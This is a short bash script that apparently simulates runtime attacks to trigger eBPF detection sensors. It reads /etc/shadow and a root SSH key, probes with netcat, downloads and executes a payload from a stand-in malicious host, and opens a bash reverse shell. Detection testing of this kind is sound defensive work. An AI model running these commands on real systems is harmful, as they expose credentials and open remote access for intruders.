#!/bin/bash
# eBPF will detect these executions
echo "Simulating Runtime Attack..."

# 1. Suspicious File Read
cat /etc/shadow > /dev/null 2>&1
cat /root/.ssh/id_rsa > /dev/null 2>&1

# 2. Suspicious Network connection (nmap or netcat)
nc -z -v -w5 8.8.8.8 53 || true
curl -s http://malicious-ip.tld/payload.sh -o payload.sh || true

# 3. Simulate cryptominer execution
echo "Executing fake miner..."
chmod +x payload.sh 2>/dev/null || true
./payload.sh 2>/dev/null || true

# 4. Spawning interactive shell / Reverse shell syntax
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 &
REVSHELL_PID=$!
sleep 2
kill $REVSHELL_PID 2>/dev/null || true

echo "Attack simulation complete. TigerGate eBPF sensors should trigger!"
